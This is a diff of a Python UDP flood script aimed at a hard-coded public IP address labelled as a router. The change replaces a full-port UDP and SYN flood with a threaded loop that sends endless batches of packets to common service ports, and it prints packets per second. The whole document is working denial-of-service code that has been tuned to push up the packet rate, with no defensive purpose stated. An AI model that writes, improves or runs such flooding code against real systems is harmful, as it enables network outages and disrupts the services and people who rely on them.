@@ -5,41 +5,29 @@ import time
 router_ip = "62.109.121.43"
 packet_count = [0]
 
-def optimized_flood(port_range):
+def max_pps_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ports = [53, 80, 443, 8080, 123, 161, 162, 67, 68, 69]
+    
     while True:
-        try:
-            # UDP part
-            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for port in port_range:
-                udp_sock.sendto(b"X" * 1024, (router_ip, port))
+        for port in ports:
+            # Send 50 packets per port in batch
+            for _ in range(50):
+                sock.sendto(b"A" * 512, (router_ip, port))
                 packet_count[0] += 1
-            
-            # SYN part (single connection attempt)
-            syn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            syn_sock.settimeout(0.01)
-            syn_sock.connect_ex((router_ip, port_range[0]))
-            syn_sock.close()
-            packet_count[0] += 1
-            
-            udp_sock.close()
-        except:
-            pass
 
-# Divide workload into 4 threads (reduces device lag)
-port_ranges = [
-    range(1, 16384),
-    range(16384, 32768),
-    range(32768, 49152),
-    range(49152, 65535)
-]
+# Start 8 threads (balance between PPS and device lag)
+for _ in range(8):
+    threading.Thread(target=max_pps_flood, daemon=True).start()
 
-for port_range in port_ranges:
-    threading.Thread(target=optimized_flood, args=(port_range,), daemon=True).start()
-
-# Lightweight logging every 5s
+# Monitor
 last_count = 0
+start_time = time.time()
+
 while True:
-    time.sleep(5)
+    time.sleep(10)
     current = packet_count[0]
-    print(f"PPS: {(current - last_count)//5}")
+    pps = (current - last_count) // 10
     last_count = current
+    
+    print(f"PPS: {pps:,}")
